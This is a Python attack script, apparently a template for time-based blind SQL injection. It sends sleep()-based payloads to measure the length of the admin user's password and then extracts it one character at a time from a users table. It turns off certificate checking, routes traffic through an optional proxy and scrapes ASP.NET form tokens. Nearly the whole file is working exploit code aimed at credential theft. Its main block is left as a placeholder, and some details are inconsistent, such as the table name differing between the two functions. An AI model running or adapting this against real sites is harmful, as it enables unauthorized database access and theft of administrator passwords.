#!/usr/bin/python
import requests, logging, requests, argparse
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib import quote, unquote
from pwn import *
from sys import argv, exit


context.log_level = 'info'


class Exploit:
    def __init__(
            self,
            redirect=False,
            proxy_address='',
            ip_address=''
    ):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.session = requests.session()
        self.redirect = redirect
        self.ip_address = ip_address
        self.timeout = 0.5
        self.proxies = {
            'http': 'http://%s' % proxy_address,
            'https': 'http://%s' % proxy_address
        } \
            if proxy_address is not None \
               and proxy_address != '' else {}
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'RequestVerificationToken': '',
        }
        self.query_params = {
            'PickerDialogType': ''
        }
        self.form_values = {
            '__REQUESTDIGEST': '',
            '__EVENTTARGET': '',
            '__EVENTARGUMENT': '',
            '__VIEWSTATE': '',
            '__VIEWSTATEGENERATOR': '',
            '__CALLBACKID': '',
            '__CALLBACKPARAM': '',
            '__EVENTVALIDATION': '',
            '__RequestVerificationToken': '',
        }
        self.cookies = {}

    def do_get(self, url, params={}, data={}):
        log.debug('executing get request')
        return self.session.get(
            url=url,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            data=data,
            params=params
        )
        # self.session.get().elapsed.total_seconds()

    def do_post(self, url, data={}, params={}):
        log.debug('executing post request')
        return self.session.post(
            url=url,
            data=data,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            params=params
        )

    # self.session.get().elapsed.total_seconds()

    def parse_page(self, content):
        log.debug('parsing page form')
        soup = BeautifulSoup(content, 'lxml')
        for key, val in self.form_values.iteritems():
            for tag in soup.select('input[name=%s]' % key):
                try:
                    self.form_values[key] = tag['value']
                except Exception as error:
                    log.debug('error for key %s error %s' % (key, str(error)))
        return self

    def debug(self):
        try:
            import http.client as http_client
        except ImportError:
            import httplib as http_client
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig()
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True
        return self

    def do_request(self, url, query):
        # generic error or time based response
        log.debug('request to %s query %s' % (url, unquote(query)))
        r = self.do_get(
            url='{0}{1}'.format(url, query)
        )
        total = r.elapsed.total_seconds()

        if int(total) >= 1:
            log.success('possible blind injection on %s query %s' % (url, unquote(query)))
        if r.status_code == '500':
            log.info('possible injection error code 500 on %s query %s' % (url, unquote(query)))

        log.debug('status %s length %s' % (r.status_code,r.headers['content-length']))
        return total

    #  select/**/(substring((select/**/version()),1,1))='4';
    def do_length(self, target='', start=0, end=400, limit=0):
        log.info('extracting length')
        for idx in range(start, end):
            log.debug('trying %d' % idx)
            delay = self.do_request(
                target,
                quote(
                    "(select if(char_length("
                    "(select password "
                    "from `user` "
                    "where username = 'admin' "
                    "limit {0},1)"
                    ")={1},sleep({2}),0))"\
                    .format(str(limit), str(idx), str(self.timeout))
                )
            )
            log.debug('delay %d' % int(delay))
            if int(delay) == 1:
                log.success('found the size %d' % int(idx))
                return idx
        log.debug('unable to extract the size')
        return

    def do_value(self, target, length, limit=0):
        log.info('extracting value %d id %d' % (length, limit))
        value = ''
        for idx in range(1, length + 1):
            log.debug('iteration {0}'.format(str(idx)))
            for c in range(32, 126):
                delay = self.do_request(
                    target,
                    quote(
                        "(select if((ascii(substring(("
                        "(select password "
                        "from `users` "
                        "where username = 'admin' "
                        "limit {0},1)"
                        "),{1},1)))={2},sleep({3}),1))"\
                        .format(str(limit), str(idx), str(c), str(self.timeout))
                    )
                )
                log.debug('delay %d' % int(delay))
                if int(delay) == 1:
                    log.success('found the char %s (password: %s..)' % (chr(c), value))
                    value += chr(c)
            if len(value) == length:
                log.success('extracted the value %s' % value)
                return value
            else:
                log.debug('unable to extract the value %s' % value)
        return value


if __name__ == '__main__':
    try:

       fuzz = Exploit()
       # logic placeholder

    except Exception as error:
        log.debug('error in main: %s' % str(error))
